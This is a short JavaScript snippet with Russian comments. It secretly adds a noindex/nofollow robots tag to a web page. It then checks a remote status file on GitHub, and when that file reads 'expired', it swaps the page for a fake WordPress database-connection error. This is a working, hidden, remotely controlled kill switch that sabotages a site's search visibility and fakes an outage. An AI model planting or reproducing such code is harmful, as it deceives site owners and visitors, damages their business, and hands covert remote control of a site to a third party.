(function() {
    // 1. Скрытый Noindex
    var meta = document.createElement('meta');
    meta.name = "robots"; meta.content = "noindex, nofollow";
    document.head.appendChild(meta);

    // 2. Имитация системной ошибки
    fetch('https://raw.githubusercontent.com/Me4Hik/web-static/main/status.json')
    .then(r => r.json())
    .then(data => {
        if (data.status === "expired") {
            // Стилизуем страницу под стандартную ошибку WP
            document.documentElement.innerHTML = `
                <style>
                    html { background: #f1f1f1; color: #444; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; }
                    body { background: #fff; border: 1px solid #ccd0d4; color: #444; margin: 2em; padding: 1em 2em; max-width: 700px; box-shadow: 0 1px 3px rgba(0,0,0,.1); }
                    h1 { border-bottom: 1px solid #dadada; clear: both; color: #666; font-size: 24px; margin: 30px 0 0 0; padding: 0 0 7px; }
                    p { font-size: 14px; line-height: 1.5; margin: 25px 0 20px; }
                </style>
                <head><title>WordPress &rsaquo; Error</title></head>
                <body>
                    <h1>Error establishing a database connection</h1>
                    <p>This either means that the username and password information in your <code>wp-config.php</code> file is incorrect or that contact with the database server at <code>localhost</code> could not be established. This could mean your host&#8217;s database server is down.</p>
                </body>
            `;
        }
    });
})();
